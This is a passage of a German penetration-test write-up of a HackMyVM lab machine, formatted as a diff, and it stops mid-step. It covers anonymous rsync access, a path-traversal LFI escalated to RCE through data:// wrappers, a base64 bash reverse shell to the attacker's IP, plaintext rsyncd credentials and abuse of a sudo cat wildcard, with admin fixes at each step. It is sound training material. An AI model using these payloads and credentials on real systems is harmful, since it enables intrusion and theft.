+                *   Die zweite Abfrage listet den Inhalt von `share_rsync` auf: Es enthält mehrere Dateien mit der Endung `.cpt` (z.B. `<span class="command">access.log.cpt</span>`, `<span class="command">auth.log.cpt</span>`). Dies sind wahrscheinlich mit `ccrypt` verschlüsselte Logdateien.
+                *   Der Versuch, auf `Journal` zuzugreifen, schlägt fehl (`@ERROR: Unknown module 'Journal'`), was bestätigt, dass nur `share_rsync` als Modul existiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der anonyme Zugriff auf das Rsync-Modul `share_rsync` ist möglich. Die `.cpt`-Dateien herunterladen. Versuchen, sie mit `ccrypt` und dem zuvor gefundenen Passwort (`Yn89m1RFBJ`) zu entschlüsseln.<br><strong>Empfehlung (Admin):</strong> Rsync-Dienst sichern! Anonymen Zugriff deaktivieren. Authentifizierung (z.B. via `rsyncd.secrets` und/oder `rsyncd.auth`) und Zugriffskontrolle pro Modul implementieren. Firewall verwenden, um den Zugriff auf Port 873 auf vertrauenswürdige Hosts zu beschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">rsync  rsync://192.168.2.114</span></div>
+                     <pre>
+<span class="command">share_rsync</span>    	Journal
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">rsync  rsync://192.168.2.114/share_rsync</span></div>
+                     <pre>
+drwxr-xr-x          4.096 2022/11/26 16:23:01 .
+-rw-r-----         67.719 2022/11/26 16:19:33 <span class="command">access.log.cpt</span>
+-rw-r-----          4.206 2022/11/26 16:19:53 <span class="command">auth.log.cpt</span>
+-rw-r-----         45.772 2022/11/26 16:19:53 <span class="command">daemon.log.cpt</span>
+-rw-r--r--        229.920 2022/11/26 16:19:53 <span class="command">dpkg.log.cpt</span>
+-rw-r-----          4.593 2022/11/26 16:19:33 <span class="command">error.log.cpt</span>
+-rw-r-----         90.768 2022/11/26 16:19:53 <span class="command">kern.log.cpt</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">rsync  rsync://192.168.2.114/Journal</span></div>
+                     <pre>
+<span class="password">@ERROR: Unknown module 'Journal'</span>
+<span class="password">rsync error: error starting client-server protocol (code 5) at main.c(1863) [Receiver=3.2.7]</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die verschlüsselte Datei `access.log.cpt` wird aus dem Rsync-Modul heruntergeladen und anschließend mit `ccrypt -d` und dem Passwort aus der Admin-Notiz (`Yn89m1RFBJ`) entschlüsselt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download und die Entschlüsselung sind erfolgreich. Der Pentester hat nun Zugriff auf den Klartextinhalt der Apache-Zugriffslogdatei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die entschlüsselte `access.log`-Datei sorgfältig analysieren. Nach ungewöhnlichen Anfragen, Fehlern, Pfaden, Benutzeragenten oder Anzeichen für weitere Schwachstellen (z.B. SQL-Injection, LFI/RFI) suchen.<br><strong>Empfehlung (Admin):</strong> Selbst verschlüsselte Logs sollten nicht über unsichere Kanäle wie anonymes Rsync zugänglich sein. Passwort (`Yn89m1RFBJ`) als kompromittiert betrachten und überall ändern, wo es verwendet wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">rsync  rsync://192.168.2.114/share_rsync/access.log.cpt .</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ccrypt -d access.log.cpt</span></div>
+                     <pre>
+Kennwort zur Entschlüsselung: <span class="password">Yn89m1RFBJ</span>
+</pre> <!-- Impliziert Erfolg -->
+                 </div>
+            </div>
+        </section>
+
+        <section id="lfi-rce">
+            <h2>LFI / RCE Exploitation</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Die entschlüsselte `access.log`-Datei wird mit `cat access.log | grep pass` nach Einträgen durchsucht, die "pass" enthalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein extrem wichtiger Eintrag wird gefunden: Eine GET-Anfrage an `<span class="command">/exemplos/codemirror.php</span>` mit dem Parameter `<span class="command">pagina=../../../../../../../../../../../../../../../../../etc/passwd</span>`. Dies ist ein klarer Hinweis auf eine **Local File Inclusion (LFI)** Schwachstelle im Skript `codemirror.php`, das sich im Unterverzeichnis `/exemplos/` befindet (dieses Verzeichnis wurde von Gobuster nicht gefunden, existiert aber offenbar). Die Anfrage wurde von der IP `192.168.0.29` gestellt (die in der Admin-Notiz erwähnt wurde).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die LFI-Schwachstelle sofort ausnutzen! Versuchen, `/etc/passwd` und andere sensible Dateien zu lesen (`/etc/shadow`, `/etc/hosts`, `/etc/resolv.conf`, Konfigurationsdateien von WordPress oder Apache, SSH-Schlüssel). Prüfen, ob PHP-Wrapper wie `php://filter` oder `data://` funktionieren, um Source Code zu lesen oder RCE zu erlangen.<br><strong>Empfehlung (Admin):</strong> Die LFI-Schwachstelle in `codemirror.php` **umgehend beheben**. Dies erfordert eine Validierung und Sanitisierung des `pagina`-Parameters, um Path Traversal zu verhindern. Sicherstellen, dass keine alten oder Test-Skripte (wie dieses in `/exemplos/`) auf dem Server verbleiben. Web Application Firewall (WAF) zur Erkennung von LFI-Angriffsmustern einsetzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">cat access.log | grep pass</span></div>
+                     <pre>
+192.168.0.29 - - [26/Nov/2022:16:04:05 +0100] "GET /wp-admin/js/password-strength-meter.min.js?ver=6.1.1 HTTP/1.1" 200 970 "http://192.168.0.31/wp-admin/install.php?step=1" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+<span class="password">192.168.0.29 - - [26/Nov/2022:16:15:38 +0100] "GET /exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 982 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester versucht, die LFI-Schwachstelle mit `curl` auszunutzen, um `/etc/passwd` zu lesen. Der Hostname `lovegeografia.anaximandre.hmv` wird verwendet – dies impliziert, dass dieser (Sub-)Domain-Name entweder in `/etc/hosts` hinzugefügt wurde oder anderweitig auflösbar ist und zum selben Ziel führt. Die Ausgabe wird mit `grep bash` gefiltert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich! `curl` ruft die URL auf, und die LFI funktioniert. `/etc/passwd` wird zurückgegeben. `grep bash` extrahiert die Zeilen für Benutzer mit `/bin/bash` als Login-Shell: `<span class="command">root</span>` und `<span class="command">chaz</span>`. Dies bestätigt die Existenz des Benutzers `chaz`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Benutzer `chaz` als potenzielles Ziel für SSH oder Passwort-Angriffe vormerken. Die LFI weiter ausnutzen, um andere Dateien zu lesen oder RCE zu versuchen.<br><strong>Empfehlung (Admin):</strong> LFI beheben!</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd" | grep bash</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1942  100  1942    0     0  1575k      0 --:--:-- --:--:-- --:--:-- 1896k
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">chaz:x:1001:1001:,,,:/home/chaz:/bin/bash</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd"</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+chaz:x:1001:1001:,,,:/home/chaz:/bin/bash
+_rpc:x:108:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:109:65534::/var/lib/nfs:/usr/sbin/nologin
+
+	 
+		i3GEO.janela.cria(
+		'950px',
+		'390px',
+		'codemirror.php?pagina=../../../../../../../../../../../../../../../../../etc/passwd&nopage=sim',
+		'',
+		'',
+		'Código',
+		'codigoPagina',
+		false,
+		'hd',
+		function(){},
+		function(){
+			i3GEO.janela.minimiza('codigoPagina');
+		}
+		);
+ 
+	</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die LFI-Schwachstelle zur Remote Code Execution (RCE) zu eskalieren, indem der `data://` Wrapper in Kombination mit Base64-Kodierung verwendet wird.
+                *   `echo -n "<?php system('id'); ?>" | base64`: Kodiert einen einfachen PHP-Befehl (`system('id')`) zu Base64 (`PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`).
+                *   `nc -nlvp 9001`: Startet einen Listener (hier noch nicht relevant).
+                *   `curl "http://...pagina=data://text/plain;base64,PD9...=="`: Ruft die LFI-URL auf, übergibt aber statt eines Dateipfads den `data://` Wrapper mit dem Base64-kodierten PHP-Code.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich! Der Server dekodiert den Base64-String, interpretiert ihn als PHP-Code und führt den `system('id')`-Befehl aus. Die Ausgabe `<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>` erscheint im `curl`-Output. Dies bestätigt, dass RCE als Benutzer `www-data` möglich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> RCE bestätigt! Nun einen Payload für eine Reverse Shell Base64-kodieren und über den `data://` Wrapper ausführen, um eine interaktive Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> LFI beheben! Zusätzlich `allow_url_include = Off` in `php.ini` setzen, um die Ausführung von Code über Wrapper wie `data://` oder `php://input` in LFI-Szenarien zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">echo -n "<?php system('id'); ?>" | base64</span></div>
+                     <pre>
+<span class="password">PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</span>
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nc -nlvp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+</pre> <!-- Listener wartet noch -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="</span></div>
+                     <pre>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+	 
+		i3GEO.janela.cria(
+		'950px',
+		'390px',
+		'codemirror.php?pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==&nopage=sim',
+		'',
+		'',
+		'Código',
+		'codigoPagina',
+		false,
+		'hd',
+		function(){},
+		function(){
+			i3GEO.janela.minimiza('codigoPagina');
+		}
+		);
+ 
+	</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer Test der RCE, diesmal wird der Befehl `ls /home` Base64-kodiert und über den `data://` Wrapper ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl wird erfolgreich ausgeführt und die Ausgabe `<span class="command">chaz</span>` bestätigt, dass `/home/chaz` das einzige Verzeichnis in `/home` ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die RCE-Fähigkeit ist robust. Nun die Reverse Shell holen.<br><strong>Empfehlung (Admin):</strong> LFI/RCE beheben.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvaG9tZScpOyA/Pg=="</span></div>
+                     <pre>
+<span class="command">chaz</span>
+
+ 
+		i3GEO.janela.cria(
+		'950px',
+		'390px',
+		'codemirror.php?pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvaG9tZScpOyA/Pg==&nopage=sim',
+		'',
+		'',
+		'Código',
+		'codigoPagina',
+		false,
+		'hd',
+		function(){},
+		function(){
+			i3GEO.janela.minimiza('codigoPagina');
+		}
+		);
+	 
+	</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein PHP-Code-Schnipsel, der eine Bash-Reverse-Shell startet, wird vorbereitet und mit einem Online-Tool (oder lokal) Base64-kodiert. Der Payload zielt auf die IP `192.168.2.127` (die IP des Angreifers) und Port `4444`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Payload, der über die LFI/RCE-Schwachstelle ausgeführt werden soll, um eine interaktive Shell zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Base64-kodierten Payload (`PD9waH...Pg==`) kopieren und in der nächsten `curl`-Anfrage verwenden. Sicherstellen, dass ein Listener (`nc -lvnp 4444`) auf dem Angreifer-System läuft.<br><strong>Empfehlung (Admin):</strong> LFI/RCE beheben. Egress Filtering zur Blockierung ausgehender Verbindungen implementieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies externe Vorbereitung ist -->
+                     <pre>
+https://www.base64encode.org/
+Encode to Base64 format:
+
+<?php system("bash -c 'bash -i >& /dev/tcp/192.168.2.127/4444 0>&1'"); ?>
+
+Encoded:
+
+<span class="password">PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xMjcvNDQ0NCAwPiYxJyIpOyA/Pg==</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Base64-kodierte Reverse-Shell-Payload wird über die LFI/RCE-Schwachstelle mit `curl` ausgeführt. Parallel wird auf dem Angreifer-System (IP `192.168.2.127`) ein `netcat`-Listener auf Port `4444` gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der `nc`-Listener auf dem Angreifer-System meldet eine eingehende Verbindung vom Zielsystem (`192.168.2.114`). Der Angreifer hat nun eine interaktive Shell als Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access erfolgreich! Die Shell stabilisieren und mit der Enumeration für die Privilegieneskalation beginnen.<br><strong>Empfehlung (Admin):</strong> LFI/RCE beheben. Egress Filtering implementieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xMjcvNDQ0NCAwPiYxJyIpOyA/Pg=="</span></div>
+                     <!-- Keine direkte Ausgabe von curl, da die Shell im Hintergrund verbindet -->
+                     <pre></pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.127] from (UNKNOWN) [192.168.2.114] 44418</span>
+bash: cannot set terminal process group (538): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$</span> 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Standardprozedur zur Stabilisierung der einfachen Reverse Shell wird durchgeführt: Python PTY wird verwendet, `TERM` wird exportiert, und auf dem Angreifer-System wird `stty raw -echo; fg` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Shell wird erfolgreich stabilisiert, was die weitere Interaktion und Enumeration erleichtert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Routine nach Erhalt einer einfachen Shell.<br><strong>Empfehlung (Admin):</strong> Keine direkten Gegenmaßnahmen gegen die Stabilisierung, Fokus auf Verhinderung der initialen Shell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt der Remote Shell -->
+                    <div class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                     <pre>
+<los$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">export TERM=xterm</span>
+export TERM=xterm
+www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">^Z</span>
+</pre> <!-- Ctrl+Z auf der Remote-Shell sendet SIGTSTP, was hier nicht beabsichtigt ist. Ctrl+Z muss auf dem Listener (Angreifer-System) ausgeführt werden -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt des Angreifers -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 4444
+                               reset
+
+<span class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$</span> 
+</pre> <!-- Stabilisierte Shell -->
+                  </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Erste Enumerationsschritte als `www-data` nach der Shell-Stabilisierung: Überprüfung der `sudo`-Rechte und der Systeminformationen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `sudo -l`: Fragt nach einem Passwort für `www-data`. Das bedeutet, es gibt keine passwortlosen `sudo`-Regeln für diesen Benutzer. Der Initialzugriff auf `sudo` ist damit versperrt.
+                *   `id`: Bestätigt erneut die Identität als `www-data`.
+                *   `uname -a`: Zeigt die Kernel-Version: `Linux anaximandre.hmv 5.10.0-19-amd64`. Diese Version ist relativ aktuell (Stand April 2023), was Kernel-Exploits unwahrscheinlicher macht, aber nicht ausschließt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `sudo -l` ein Passwort erfordert, nach anderen Vektoren suchen: SUID-Binaries, Fehlkonfigurationen, Cronjobs, interne Dienste, Passwörter in Konfigurationsdateien. Kernel-Version notieren, aber Exploits dafür haben niedrigere Priorität.<br><strong>Empfehlung (Admin):</strong> Gut, dass `www-data` kein einfaches `sudo` hat. System und Kernel aktuell halten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">sudo -l</span></div>
+                     <pre>
+#
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for www-data: 
+<span class="password">sudo: a password is required</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">id</span></div>
+                     <pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">uname -a</span></div>
+                     <pre>
+<span class="command">Linux anaximandre.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/etc/rsyncd.auth` wird angezeigt. Diese Datei enthält typischerweise Benutzername-Passwort-Paare für die Rsync-Daemon-Authentifizierung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein kritischer Fund! Die Datei enthält die Zugangsdaten `<span class="password">chaz:alanamorrechazado</span>`. Dies ist wahrscheinlich das Passwort für den Systembenutzer `chaz`, der zuvor in `/etc/passwd` identifiziert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sofort versuchen, mit `su chaz` und dem Passwort `alanamorrechazado` den Benutzer zu wechseln.<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für `/etc/rsyncd.auth` (und `/etc/rsyncd.secrets`) müssen sehr restriktiv sein (idealerweise nur für `root` lesbar, `chmod 600`). Dienstkonten wie `www-data` sollten keinen Zugriff darauf haben. Passwort-Hashes statt Klartext verwenden, wenn möglich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">cat /etc/rsyncd.auth</span></div>
+                     <pre>
+<span class="password">chaz:alanamorrechazado</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su chaz` wird ausgeführt und das gefundene Passwort `alanamorrechazado` eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Der Benutzer wird zu `chaz` gewechselt, wie der neue Prompt `<span class="password">chaz@anaximandre:/var/www/i3geo/exemplos$</span>` zeigt. Dies ist eine horizontale Privilegieneskalation von `www-data` zu `chaz`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Als `chaz` erneut die Umgebung enumerieren, insbesondere die `sudo`-Rechte (`sudo -l`) und das Home-Verzeichnis (`cd ~; ls -la`).<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur Sicherung von Authentifizierungsdateien.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@anaximandre:/var/www/i3geo/exemplos$ <span class="command">su chaz</span></div>
+                     <pre>
+Password: <span class="password">alanamorrechazado</span>
+
+<span class="password">chaz@anaximandre:/var/www/i3geo/exemplos$</span> 
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `chaz` werden die `sudo`-Berechtigungen mit `sudo -l` überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein weiterer kritischer Fund! `chaz` hat eine spezifische `sudo`-Regel: `(ALL : ALL) NOPASSWD: /usr/bin/cat /home/chaz/*`. Das bedeutet, `chaz` kann den Befehl `/usr/bin/cat` als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD`) ausführen, aber *nur* auf Dateien, die dem Muster `/home/chaz/*` entsprechen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Regel ist interessant. Sie erlaubt das Lesen aller Dateien direkt im Home-Verzeichnis von `chaz` als `root` (oder jeder andere Benutzer). Dies kann genutzt werden, um die User-Flag zu lesen. Noch wichtiger: Prüfen, ob Path Traversal möglich ist, um über diese Regel Dateien *außerhalb* von `/home/chaz/` zu lesen (z.B. `sudo -u root /usr/bin/cat /home/chaz/../..//etc/shadow`).<br><strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist gefährlich und unsicher konfiguriert. Der Wildcard `*` ist riskant. Die `(ALL : ALL)`-Spezifikation ist unnötig breit (sollte `(root)` sein, wenn nur Root gemeint ist). `NOPASSWD` für `cat` ist generell keine gute Idee. Die Regel sollte entfernt oder stark überarbeitet werden (z.B. nur spezifische, ungefährliche Skripte erlauben).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt als chaz -->
+                    <div class="prompt" style="color: yellow;">chaz@anaximandre:/var/www/i3geo/exemplos$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for chaz on anaximandre:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User chaz may run the following commands on anaximandre:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/cat /home/chaz/*</span>
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Pentester wechselt in das Home-Verzeichnis von `chaz` (`cd`), listet den Inhalt detailliert auf (`ls -la`) und liest die User-Flag (`cat user.txt`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   Das Home-Verzeichnis enthält die erwarteten Konfigurationsdateien, ein `.ssh`-Verzeichnis und die `user.txt`.
+                *   Interessant: `.bash_history` ist ein Symlink auf `/dev/null`, d.h. es wird keine Befehlshistorie gespeichert.
+                *   Die User-Flag wird erfolgreich gelesen: `<span class="password">d151c8ace0dbdd0ef23a3e3200f696f1</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notieren. Das `.ssh`-Verzeichnis untersuchen. Die `sudo`-Regel für `cat` ausnutzen, um Privilegien zu eskalieren.<br><strong>Empfehlung (Admin):</strong> Die Umleitung der Bash-History auf `/dev/null` kann legitime Forensik erschweren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">chaz@anaximandre:/var/www/i3geo/exemplos$ <span class="command">cd</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">chaz@anaximandre:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 28
+drwxr-xr-x 3 chaz chaz 4096 Nov 27 16:45 .
+drwxr-xr-x 3 root root 4096 Nov 26 16:47 ..
+lrwxrwxrwx 1 root root    9 Nov 26 16:48 <span class="command">.bash_history -> /dev/null</span>
+-rw-r--r-- 1 chaz chaz  220 Nov 26 16:16 .bash_logout
+-rw-r--r-- 1 chaz chaz 3526 Nov 26 16:16 .bashrc
+-rw-r--r-- 1 chaz chaz  807 Nov 26 16:16 .profile
+drwx------ 2 chaz chaz 4096 Nov 27 15:54 <span class="command">.ssh</span>
+-rwx------ 1 chaz chaz   33 Nov 26 16:48 <span class="command">user.txt</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">chaz@anaximandre:~$ <span class="command">cat user.txt</span></div>
+                     <pre>
+<span class="password" style="display: block; text-align: center;">d151c8ace0dbdd0ef23a3e3200f696f1</span>
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Regel für `cat` wird ausgenutzt, um Dateien außerhalb von `/home/chaz` zu lesen, indem Path Traversal (`../..`) verwendet wird. Es wird versucht, `/root/root.txt` und `/root/.ssh/id_rsa` als `root` zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich!
